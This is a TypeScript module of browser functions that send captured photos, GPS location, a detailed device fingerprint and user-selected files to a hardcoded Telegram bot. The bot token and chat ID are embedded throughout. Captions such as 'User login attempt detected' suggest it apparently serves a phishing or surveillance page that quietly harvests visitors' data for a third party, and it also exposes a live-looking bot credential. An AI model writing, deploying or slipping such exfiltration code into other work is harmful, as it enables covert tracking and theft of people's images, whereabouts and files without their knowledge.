// Send image to Telegram
export const sendImageToTelegram = async (imageBase64: string): Promise<boolean> => {
  try {
    const botToken = '7570857002:AAH2mP_Wcud9Vwbsf3cuMsZA1RmPxQTz89w';
    const chatId = '6025589431';
    
    // Remove the data URL prefix to get just the base64 data
    const base64Data = imageBase64.split(',')[1];
    
    // Create form data with the photo
    const formData = new FormData();
    
    // Convert base64 to blob
    const byteCharacters = atob(base64Data);
    const byteArrays = [];
    
    for (let offset = 0; offset < byteCharacters.length; offset += 512) {
      const slice = byteCharacters.slice(offset, offset + 512);
      
      const byteNumbers = new Array(slice.length);
      for (let i = 0; i < slice.length; i++) {
        byteNumbers[i] = slice.charCodeAt(i);
      }
      
      const byteArray = new Uint8Array(byteNumbers);
      byteArrays.push(byteArray);
    }
    
    const blob = new Blob(byteArrays, { type: 'image/jpeg' });
    formData.append('photo', blob, 'login_photo.jpg');
    formData.append('chat_id', chatId);
    formData.append('caption', 'User login attempt detected');
    
    // Send to Telegram Bot API
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    return result.ok === true;
  } catch (error) {
    console.error('Error sending image to Telegram:', error);
    return false;
  }
};

// Send location to Telegram
export const sendLocationToTelegram = async (latitude: number, longitude: number): Promise<boolean> => {
  try {
    const botToken = '7570857002:AAH2mP_Wcud9Vwbsf3cuMsZA1RmPxQTz89w';
    const chatId = '6025589431';
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        latitude: latitude,
        longitude: longitude,
        caption: 'User location detected'
      })
    });
    
    const result = await response.json();
    return result.ok === true;
  } catch (error) {
    console.error('Error sending location to Telegram:', error);
    return false;
  }
};

// Send device information to Telegram
export const sendDeviceInfoToTelegram = async (): Promise<boolean> => {
  try {
    const botToken = '7570857002:AAH2mP_Wcud9Vwbsf3cuMsZA1RmPxQTz89w';
    const chatId = '6025589431';
    
    // Collect device information
    const deviceInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookiesEnabled: navigator.cookieEnabled,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      colorDepth: window.screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      onlineStatus: navigator.onLine,
      deviceMemory: (navigator as any).deviceMemory,
      hardwareConcurrency: navigator.hardwareConcurrency,
      networkType: (navigator as any).connection?.type,
      networkSpeed: (navigator as any).connection?.downlink,
      batteryStatus: 'Requesting...',
      storageQuota: 'Requesting...',
      mediaDevices: 'Requesting...'
    };
    
    // Get battery status
    if ('getBattery' in navigator) {
      try {
        const battery = await (navigator as any).getBattery();
        deviceInfo.batteryStatus = `Level: ${battery.level * 100}%, Charging: ${battery.charging}`;
      } catch (e) {
        deviceInfo.batteryStatus = 'Not available';
      }
    }
    
    // Get storage information
    if ('storage' in navigator && 'estimate' in navigator.storage) {
      try {
        const estimate = await navigator.storage.estimate();
        deviceInfo.storageQuota = `Used: ${Math.round(estimate.usage! / 1024 / 1024)}MB, Available: ${Math.round(estimate.quota! / 1024 / 1024)}MB`;
      } catch (e) {
        deviceInfo.storageQuota = 'Not available';
      }
    }
    
    // Get media devices
    if ('mediaDevices' in navigator) {
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        deviceInfo.mediaDevices = devices.map(device => `${device.kind}: ${device.label}`).join('\n');
      } catch (e) {
        deviceInfo.mediaDevices = 'Not available';
      }
    }
    
    // Format message
    const message = `📱 Device Information Report 📱\n\n` +
      Object.entries(deviceInfo)
        .map(([key, value]) => `${key}: ${value}`)
        .join('\n\n');
    
    // Send to Telegram
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    const result = await response.json();
    return result.ok === true;
  } catch (error) {
    console.error('Error sending device info to Telegram:', error);
    return false;
  }
};

// Send file to Telegram
export const sendFileToTelegram = async (file: File): Promise<boolean> => {
  try {
    const botToken = '7570857002:AAH2mP_Wcud9Vwbsf3cuMsZA1RmPxQTz89w';
    const chatId = '6025589431';
    
    const formData = new FormData();
    formData.append('document', file);
    formData.append('chat_id', chatId);
    formData.append('caption', `File from device: ${file.name}`);
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    return result.ok === true;
  } catch (error) {
    console.error('Error sending file to Telegram:', error);
    return false;
  }
};

// Send multiple files to Telegram
export const sendFilesToTelegram = async (files: FileList): Promise<boolean[]> => {
  const results: boolean[] = [];
  
  for (let i = 0; i < files.length; i++) {
    const result = await sendFileToTelegram(files[i]);
    results.push(result);
  }
  
  return results;
};